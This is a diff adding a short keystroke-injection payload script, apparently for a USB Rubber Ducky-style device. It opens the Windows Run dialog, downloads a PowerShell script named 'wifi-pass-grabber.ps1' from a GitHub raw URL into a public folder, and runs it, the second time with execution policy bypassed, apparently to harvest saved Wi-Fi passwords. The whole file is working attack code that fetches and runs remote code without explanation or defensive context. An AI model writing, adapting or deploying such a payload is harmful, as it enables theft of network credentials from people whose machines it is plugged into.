@@ -1,0 +1,11 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KoosVanDerMerwe/Wifi-Pass-Graber/main/wifi-pass-grabber.ps1' -OutFile 'C:\Users\Public\wifi-pass.ps1'; Start-Process pwsh -ArgumentList 'C:\Users\Public\wifi-pass.ps1' -Wait}"
+ENTER
+DELAY 5000
+GUI r
+DELAY 1000
+STRING powershell -ExecutionPolicy Bypass -File C:\Users\Public\wifi-pass.ps1
+ENTER
+DELAY 10000
